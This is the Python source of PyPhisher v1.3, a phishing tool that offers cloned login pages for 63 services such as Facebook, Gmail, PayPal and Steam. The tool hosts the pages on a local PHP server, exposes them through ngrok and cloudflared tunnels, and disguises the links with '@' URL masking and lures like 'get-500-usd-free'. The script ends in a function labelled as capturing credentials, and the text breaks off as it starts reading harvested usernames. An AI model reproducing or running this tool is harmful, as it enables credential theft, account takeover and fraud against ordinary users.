# -*- coding: UTF-8 -*-
# Tool    : PyPhisher
# Version : 1.3
# Author  : KasRoudra
# Github  : https://github.com/KasRoudra
# Contact : https://m.me/KasRoudra
# PyPhisher is a phishing tool in python
# Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# Portable file/script
# If you copy open source code, consider giving credit

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2021 KasRoudra (https://github.com/KasRoudra)
"""

import os, sys, time, socket, json
from urllib.request import urlretrieve
from os import popen, system
from time import sleep

# Normal
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.3"

ask = green + '[' + white + '?' + green + '] '+ yellow
success = yellow + '[' + white + '√' + yellow + '] '+green
error = blue + '[' + white + '!' + blue + '] '+red
info= yellow + '[' + white + '+' + yellow + '] '+ cyan
info2= green + '[' + white + '•' + green + '] '+ purple

root= popen("cd $HOME && pwd").read().strip()
socket.setdefaulttimeout(30)

# Check termux
if os.path.exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False

pkgs=[ "php", "curl", "wget", "unzip" ]

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo='''
'''+red+'''  _____       _____  _     _     _               
'''+cyan+''' |  __ \     |  __ \| |   (_)   | |              
'''+yellow+''' | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
'''+blue+''' |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
'''+red+''' | |   | |_| | |    | | | | \__ \ | | |  __/ |   
'''+yellow+''' |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
'''+green+'''         __/ |                          '''+cyan+'''[v1.3]
'''+cyan+'''        |___/                   '''+red+'''[By KasRoudra]
'''

# Website chooser
def options():
    print()
    print(green+'['+white+'01'+green+']'+yellow+' Facebook Traditional    '+green+'['+white+'22'+green+']'+yellow+' LinkedIn       '+green+'['+white+'43'+green+']'+yellow+' Origin')
    print(green+'['+white+'02'+green+']'+yellow+' Facebook Voting         '+green+'['+white+'23'+green+']'+yellow+' Ebay           '+green+'['+white+'44'+green+']'+yellow+' DropBox')
    print(green+'['+white+'03'+green+']'+yellow+' Facebook Security       '+green+'['+white+'24'+green+']'+yellow+' Quora          '+green+'['+white+'45'+green+']'+yellow+' Yahoo')
    print(green+'['+white+'04'+green+']'+yellow+' Messenger               '+green+'['+white+'25'+green+']'+yellow+' Protonmail     '+green+'['+white+'46'+green+']'+yellow+' WordPress')
    print(green+'['+white+'05'+green+']'+yellow+' Instagram Traditional   '+green+'['+white+'26'+green+']'+yellow+' Spotify        '+green+'['+white+'47'+green+']'+yellow+' Yandex')
    print(green+'['+white+'06'+green+']'+yellow+' Insta Auto Followers    '+green+'['+white+'27'+green+']'+yellow+' Reddit         '+green+'['+white+'48'+green+']'+yellow+' StackOverflow')
    print(green+'['+white+'07'+green+']'+yellow+' Insta 1000 Followers    '+green+'['+white+'28'+green+']'+yellow+' Adobe          '+green+'['+white+'49'+green+']'+yellow+' VK')
    print(green+'['+white+'08'+green+']'+yellow+' Insta Blue Verify       '+green+'['+white+'29'+green+']'+yellow+' DevianArt      '+green+'['+white+'50'+green+']'+yellow+' VK Poll')
    print(green+'['+white+'09'+green+']'+yellow+' Gmail Old               '+green+'['+white+'30'+green+']'+yellow+' Badooo         '+green+'['+white+'51'+green+']'+yellow+' Xbox')
    print(green+'['+white+'10'+green+']'+yellow+' Gmail New               '+green+'['+white+'31'+green+']'+yellow+' Clash Of Clans '+green+'['+white+'52'+green+']'+yellow+' Mediafire')
    print(green+'['+white+'11'+green+']'+yellow+' Gmail Poll              '+green+'['+white+'32'+green+']'+yellow+' Ajio           '+green+'['+white+'53'+green+']'+yellow+' Gitlab')
    print(green+'['+white+'12'+green+']'+yellow+' Microsoft               '+green+'['+white+'33'+green+']'+yellow+' JioRouter      '+green+'['+white+'54'+green+']'+yellow+' Github')
    print(green+'['+white+'13'+green+']'+yellow+' Netflix                 '+green+'['+white+'34'+green+']'+yellow+' FreeFire       '+green+'['+white+'55'+green+']'+yellow+' Apple')
    print(green+'['+white+'14'+green+']'+yellow+' Paypal                  '+green+'['+white+'35'+green+']'+yellow+' Pubg           '+green+'['+white+'56'+green+']'+yellow+' iCloud')
    print(green+'['+white+'15'+green+']'+yellow+' Steam                   '+green+'['+white+'36'+green+']'+yellow+' Telegram       '+green+'['+white+'57'+green+']'+yellow+' Shopify')
    print(green+'['+white+'16'+green+']'+yellow+' Twitter                 '+green+'['+white+'37'+green+']'+yellow+' Youtube        '+green+'['+white+'58'+green+']'+yellow+' Myspace')
    print(green+'['+white+'17'+green+']'+yellow+' PlayStation             '+green+'['+white+'38'+green+']'+yellow+' Airtel         '+green+'['+white+'59'+green+']'+yellow+' Shopping')
    print(green+'['+white+'18'+green+']'+yellow+' TikTok                  '+green+'['+white+'39'+green+']'+yellow+' SocialClub     '+green+'['+white+'60'+green+']'+yellow+' Cryptocurrency')
    print(green+'['+white+'19'+green+']'+yellow+' Twitch                  '+green+'['+white+'40'+green+']'+yellow+' Ola            '+green+'['+white+'61'+green+']'+yellow+' SnapChat2')
    print(green+'['+white+'20'+green+']'+yellow+' Pinterest               '+green+'['+white+'41'+green+']'+yellow+' Outlook        '+green+'['+white+'62'+green+']'+yellow+' Verizon')
    print(green+'['+white+'21'+green+']'+yellow+' SnapChat                '+green+'['+white+'42'+green+']'+yellow+' Amazon         '+green+'['+white+'63'+green+']'+yellow+' Wi-Fi')
    print()
    print(green+'['+white+'x'+green+']'+yellow+' About                    '+green+'['+white+'m'+green+']'+yellow+' More tools      '+green+'['+white+'0'+green+']'+yellow+' Exit')
    print()
    print()

# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")


# Download progressbar
def reporthook(blocknum, blocksize, totalsize):
    readsofar = blocknum * blocksize
    if totalsize > 0:
        percent = readsofar * 1e2 / totalsize
        s = "\r%5.1f%% %*d / %d" % (
            percent, len(str(totalsize)), readsofar, totalsize)
        sys.stderr.write(s)
        if readsofar >= totalsize:
            sys.stderr.write("\n")
    else:
        sys.stderr.write("read %d\n" % (readsofar,))

# Update of PyPhisher
def update():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log").read()
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
        upask=input(ask+"Do you want to update PyPhisher?[y/n] > "+green)
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint("\n"+success+"PyPhisher updated successfully!!\n")
            if (changelog != "404: Not Found"):
                print(info2+"Changelog:\n"+purple+changelog)
            exit()
        elif upask=="n":
            print("\n"+info+"Updating cancelled. Using old version!")
            sleep(2)
        else:
            print("\n"+error+"Wrong input!\n")
            sleep(2)

# Print logo
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Print lines
def sprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.05)

# Internet Checker
def internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
    except socket.error:
        print(error+"No internet!")
        time.sleep(2)
        internet()

# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
            system(pm+" install -y "+pkgs[pkg])

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
            sprint(info+"Installing "+pkgs[pkg].upper()+nc)
            system("sudo "+pm+" install -y "+pkgs[pkg])


# Ask to mask url
def cuask(url):
    cust= input("\n"+ask+bcyan+"Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Info about tool
def about():
    system("clear")
    slowprint(logo)
    print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
    print(red+'[Version]   '+cyan+' :[1.3]')
    print(red+'[Author]    '+cyan+' :[KasRoudra] ')
    print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
    print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
    print(red+'[Email]     '+cyan+' :[kasroudrakrd@gmail.com]')
    print()
    print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
    print()
    abot= input("\n > ")
    if abot== "0":
        exit()
    else:
        main()

# First function main
def main():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
    if True:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
                    sprint("\n"+info+"Installing "+pkgs[pkg].upper()+nc)
                    system("sudo pacman -S "+pkgs[pkg]+" --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint("\n"+error+"Unsupported package manager. Install packages manually!"+nc)
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(error+"PHP cannot be installed. Install it manually!")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(error+"Unzip cannot be installed. Install it manually!")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(error+"Curl cannot be installed. Install it manually!")
        exit(1)
    killer()
    x=popen("uname -m").read()
    y=popen("uname").read()
    if not os.path.isfile(root+"/.ngrokfolder/ngrok"):
        sprint("\n"+info+"Downloading ngrok....."+nc)
        internet()
        system("rm -rf file.zip")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz", "file.zip", reporthook)
                system("tar -zxf file.zip > /dev/null 2>&1")
            elif x.find("arm")!=-1:
                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip", "file.zip", reporthook)
                system("unzip file.zip > /dev/null 2>&1")
            elif x.find("x86_64")!=-1:
                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip", "file.zip", reporthook)
                system("unzip file.zip > /dev/null 2>&1")
            else:
                urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip", "file.zip", reporthook)
                system("unzip file.zip > /dev/null 2>&1")
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
            elif x.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf file.zip && mkdir $HOME/.ngrokfolder")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not os.path.isfile(root+"/.cffolder/cloudflared"):
        sprint("\n"+info+"Downloading cloudflared....."+nc)
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if y.find("Linux")!=-1:
            if x.find("aarch64")!=-1:
                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", "cloudflared", reporthook)
            elif x.find("arm")!=-1:
                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", "cloudflared", reporthook)
            elif x.find("x86_64")!=-1:
                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared", reporthook)
            else:
                urlretrieve("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", "cloudflared", reporthook)
        elif y.find("Darwin")!=-1:
            if x.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
            elif x.find("arm64")!=-1:
                print(f"{error}Cloudflared not available for device architecture!")
                sleep(3)
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("mkdir $HOME/.cffolder")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(error+"Previous php still running! Please restart terminal and try again"+nc)
        exit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(error+"Previous ngrok still running. Please restart terminal and try again"+nc)
        exit()
    while True:
        os.system("clear")
        slowprint(logo)
        options()
        choose= input(ask+"Select one of the options > "+nc)
        if choose=="1" or choose == "01":
            folder="facebook"
            mask="https://blue-verified-facebook-free"
            requirements(folder,mask)
        elif choose == "2" or choose == "02":
            folder="fb_advanced"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "3" or choose == "03":
            folder="fb_security"
            mask='https://make-your-facebook-secured-and-free-from-hackers'
            requirements(folder,mask)
        elif choose == "4" or choose == "04":
            folder="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            requirements(folder,mask)
        elif choose == "5" or choose == "05":
            folder="instagram"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "6" or choose== "06":
            folder="ig_followers"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "7" or choose == "07":
            folder="insta_followers"
            mask='https://get-1000-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "8" or choose == "08":
            folder="ig_verify"
            mask='https://blue-badge-verify-for-instagram-free'
            requirements(folder,mask)
        elif choose == "9" or choose == "09":
            folder="google"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "10":
            folder="google_new"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "11":
            folder="google_poll"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "12":
            folder="microsoft"
            mask='https://unlimited-onedrive-space-for-free'
            requirements(folder,mask)
        elif choose == "13":
            folder="netflix"
            mask='https://upgrade-your-netflix-plan-free'
            requirements(folder,mask)
        elif choose == "14":
            folder="paypal"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "15":
            folder="steam"
            mask='https://steam-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "16":
            folder="twitter"
            mask='https://get-blue-badge-on-twitter-free'
            requirements(folder,mask)
        elif choose == "17":
            folder="playstation"
            mask='https://playstation-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "18":
            folder="tiktok"
            mask='https://tiktok-free-liker'
            requirements(folder,mask)
        elif choose == "19":
            folder="twitch"
            mask='https://unlimited-twitch-tv-user-for-free'
            requirements(folder,mask)
        elif choose == "20":
            folder="pinterest"
            mask='https://get-a-premium-plan-for-pinterest-free'
            requirements(folder,mask)
        elif choose == "21":
            folder="snapchat"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "22":
            folder="linkedin"
            mask='https://get-a-premium-plan-for-linkedin-free'
            requirements(folder,mask)
        elif choose == "23":
            folder="ebay"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "24":
            folder="quora"
            mask='https://quora-premium-for-free'
            requirements(folder,mask)
        elif choose == "25":
            folder="protonmail"
            mask='https://protonmail-pro-basics-for-free'
            requirements(folder,mask)
        elif choose == "26":
            folder="spotify"
            mask='https://convert-your-account-to-spotify-premium'
            requirements(folder,mask)
        elif choose == "27":
            folder="reddit"
            mask='https://reddit-official-verified-member-badge'
            requirements(folder,mask)
        elif choose == "28":
            folder="adobe"
            mask='https://get-adobe-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "29":
            folder="deviantart"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "30":
            folder="badoo"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "31":
            folder="clashofclans"
            mask='https://get-unlimited-gems-in-your-coc-account'
            requirements(folder,mask)
        elif choose == "32":
            folder="ajio"
            mask='https://get-limited-time-discount'
            requirements(folder,mask)
        elif choose == "33":
            folder="jiorouter"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "34":
            folder="freefire"
            mask='https://get-unlimited-diamonds-in-your-ff-account'
            requirements(folder,mask)
        elif choose == "35":
            folder="pubg"
            mask='https://get-unlimited-diamonds-in-your-pubg-account'
            requirements(folder,mask)
        elif choose == "36":
            folder="telegram"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "37":
            folder="youtube"
            mask='https://get-1k-like-in-any-video'
            requirements(folder,mask)
        elif choose == "38":
            folder="airtelsim"
            mask='https://get-500-cureency-free-to-your-account'
            requirements(folder,mask)
        elif choose == "39":
            folder="socialclub"
            mask='https://get-premium-membership-free'
            requirements(folder,mask)
        elif choose == "40":
            folder="ola"
            mask='https://get-1k-followers-on-gitlab-free'
            requirements(folder,mask)
        elif choose == "41":
            folder="outlook"
            mask='https://grab-mail-from-anyother-outlook-account-free'
            requirements(folder,mask)
        elif choose == "42":
            folder="amazon"
            mask='https://get-limited-time-discount-free'
            requirements(folder,mask)
        elif choose == "43":
            folder="origin"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "44":
            folder="dropbox"
            mask='https://get-1TB-cloud-storage-free'
            requirements(folder,mask)
        elif choose == "45":
            folder="yahoo"
            mask='https://grab-mail-from-anyother-yahoo-account-free'
            requirements(folder,mask)
        elif choose == "46":
            folder="wordpress"
            mask='https://unlimited-wordpress-traffic-free'
            requirements(folder,mask)
        elif choose == "47":
            folder="yandex"
            mask='https://grab-mail-from-anyother-yandex-account-free'
            requirements(folder,mask)
        elif choose == "48":
            folder="stackoverflow"
            mask='https://get-stackoverflow-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "49":
            folder="vk"
            mask='https://vk-premium-real-method-2020'
            requirements(folder,mask)
        elif choose == "50":
            folder="vk_pole"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "51":
            folder="xbox"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "52":
            folder="mediafire"
            mask='https://get-1TB-on-mediafire-free'
            requirements(folder,mask)
        elif choose == "53":
            folder="gitlab"
            mask='https://get-1k-followers-on-gitlab-free'
            requirements(folder,mask)
        elif choose == "54":
            folder="github"
            mask='https://get-1k-followers-on-github-free'
            requirements(folder,mask)
        elif choose == "55":
            folder="apple"
            mask='https://get-apple-premium-account-free'
            requirements(folder,mask)
        elif choose == "56":
            folder="icloud"
            mask='https://unlimited-storage-icloud-free'
            requirements(folder,mask)
        elif choose == "57":
            folder="shopify"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "58":
            folder="myspace"
            mask='https://get-1k-followers-on-myspace-free-free'
            requirements(folder,mask)
        elif choose == "59":
            folder="shopping"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "60":
            folder="cryptocurrency"
            mask='https://get-bitcoins-free'
            requirements(folder,mask)
        elif choose == "61":
            folder="snapchat2"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "62":
            folder="verizon"
            mask='https://get-verizon-premium-account-free'
            requirements(folder,mask)
        elif choose == "63":
            folder="wifi"
            mask='https://reconnect-your-wifi'
            requirements(folder,mask)
        elif choose == "x" or choose == "X":
            about()
        elif choose == "m" or choose == "M":
            system("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
            main()
        elif choose=="0":
            exit(0)
        else:
            sprint("\n"+error+"Wrong input")
            main()

# 2nd function checking requirements and download files 
def requirements(folder,mask):
    while True:
        if os.path.exists(root+"/.site"):
            system("rm -rf $HOME/.site && cd $HOME && mkdir .site")
            break
        else:
            system("cd $HOME && mkdir .site")
            break
    if os.path.isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        os.remove("websites.zip")
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
        else:
            internet()
            sprint("\n"+info+"Downloading required files.....\n")
            system("rm -rf site.zip")
            urlretrieve("https://github.com/KasRoudra/files/raw/main/phishingsites/"+folder+".zip", "site.zip", reporthook)
            if not os.path.exists(root+"/.websites"):
                system("cd $HOME && mkdir .websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system("unzip site.zip -d $HOME/.websites/"+folder)
            os.remove("site.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    system("clear")
    slowprint(logo)
    if termux:
        sprint("\n"+info+"If you haven't enabled hotspot, please enable it!")
    sprint("\n"+info2+"Initializing PHP server at localhost:8080....")
    internet()
    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            sprint("\n"+info+"PHP Server has started successfully!")
            break
        else:
            sprint(error+"PHP Error")
            killer()
            exit(1)
    sprint("\n"+info2+"Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            system("cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
        else:
            system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            system("cd $HOME/.cffolder && ./cloudflared tunnel -url 127.0.0.1:8080 --logfile log.txt > /dev/null 2>&1 &")
            break
    sleep(9)
    ngroklink=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngroklink.find("ngrok")!=-1:
        ngrokcheck=True
    else:
        ngrokcheck=False
    cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cflink.find("cloudflare")!=-1:
        cfcheck=True
    else:
        cfcheck=False
    while True:
        if ngrokcheck and cfcheck:
            url_manager(cflink, "1", "2")
            url_manager(ngroklink, "3", "4")
            cuask(cflink)
            break
        elif not ngrokcheck and cfcheck:
            url_manager(cflink, "1", "2")
            cuask(cflink)
            break
        elif not cfcheck and ngrokcheck:
            url_manager(ngroklink, "1", "2")
            cuask(ngroklink)
            break
        elif not (cfcheck and ngrokcheck):
            sprint("\n"+error+"Tunneling falied!"+nc)
            killer()
            exit()
        else:
            sprint("\n"+error+"Unknown error!")
            killer()
            exit()


# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url
    internet()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
    if not main2.find("gd")!=-1:
        sprint(error+"Service not available")
        waiter()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint("\n"+error+"No domain!")
        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
        if (bait==""):
            sprint("\n"+error+"No bait word!")
            sprint("\n"+success+"Your url is > https://"+ main)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= "https://"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
        if (bait==""):
            sprint("\n"+error+"No bait word!")
            final= domain+"@"+main
            sprint("\n"+success+"Your url is > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Enter bait words without space and hyphen(Example: free-money, pubg-mod) > ")
        if bait=="":
            sprint("\n"+error+"No bait word!")
            final= domain+"@"+main
            sprint("\n"+success+"Your url is > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()

# Output urls
def url_manager(url,num1,num2):
    internet()
    with open(root+"/.site/.info.txt", "r") as inform:
        masked=inform.read()

    sprint("\n"+success+"Your urls are given below: \n")
    system("rm -rf $HOME/.site/ip.txt")
    print(info2+"URL "+num1+" > "+yellow+url)
    print(info2+"URL "+num2+" > "+yellow+masked.strip()+"@"+url.replace("https://",""))


# Last function capturing credentials
def waiter():
    sprint("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
